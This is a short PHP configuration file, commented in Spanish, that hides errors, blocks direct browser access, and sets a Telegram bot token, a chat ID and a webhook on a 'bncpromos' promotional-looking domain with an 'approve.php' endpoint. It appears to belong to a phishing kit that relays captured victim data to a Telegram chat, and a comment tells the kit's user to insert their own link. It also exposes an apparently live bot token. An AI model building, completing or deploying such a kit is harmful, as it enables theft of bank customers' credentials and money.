<?php
// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔒 Bloquear acceso directo desde navegador
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso prohibido.');
}

// ⚙️ Configuración principal (solo accesible por inclusión)
$bot_token_2 = '8983291739:AAGSKbndxcYU45667AwPqR0nseA1jruMcZY';  
$chat_id_2   = '-5392324749';
$webhook_url = 'https://bncpromos.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
?>
